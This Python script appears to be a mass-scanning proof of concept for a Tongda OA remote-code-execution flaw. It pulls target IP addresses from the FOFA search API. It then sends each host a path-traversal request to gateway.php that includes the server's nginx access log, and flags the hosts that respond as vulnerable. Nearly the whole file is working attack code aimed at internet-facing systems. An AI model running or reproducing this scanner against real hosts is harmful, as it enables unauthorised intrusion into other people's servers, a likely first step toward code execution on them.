import requests

title = '''
 ______                     __        ____   ___     ___   _____ ____
/_  __/___   ___  ___ _ ___/ /___ _  / __ \ / _ |   / _ \ / ___// __/
 / /  / _ \ / _ \/ _ `// _  // _ `/ / /_/ // __ |  / , _// /__ / _/  
/_/   \___//_//_/\_, / \_,_/ \_,_/  \____//_/ |_| /_/|_| \___//___/  
                /___/                                                
By Nick Yan
'''

requests.adapters.DEFAULT_RETRIES = 5
requests.packages.urllib3.disable_warnings()

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Connection':'close',
}

proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080',
}

def fofa():
    '''
    首先调用 fofa 的 api 来抓取符合条件的 IP
    '''
    addr = "https://fofa.so/api/v1/search/all"

    parameters = {
        # 这里填入 fofa 的 api 参数    
    }

    try:
        resp = requests.get(url=addr, params=parameters, headers=headers, proxies=proxies, verify=False)

        if resp.status_code != 200:
            print("Wrong status code:", resp.status_code)
            return
        
        data = resp.json()["results"]

        IPS = []
        for i in data:
            IPS.append(str(i[0]))
        
        return IPS
    except Exception as e:
        print(e)
        return


def POC(ip):
    '''
    验证漏洞
    '''

    if ip.startswith("http"):
        url = ip +"/ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log"
    else:
        url = "http://" + ip + "/ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log"

    try:
        resp = requests.get(url=url, headers=headers, proxies=proxies, timeout=5, verify=False)
    except Exception as e:
        print(e)
        return False

    if not resp:
        return False
    if resp.status_code != 200:
        return False
    if "No input file specified." in resp.text:
        return False
    if "ERROR" in resp.text:
        return False
    if "RELOGIN" in resp.text:
        return False

    else:
        print("发现漏洞...")
        return True



if __name__ == "__main__":
    
    print(title)

    IPS = fofa()
    if not IPS:
        print("没有获取到 IP")
    else:
        for i in IPS:
            if POC(i):
                print("%s 可能存在漏洞" %i)
        print("Finish...")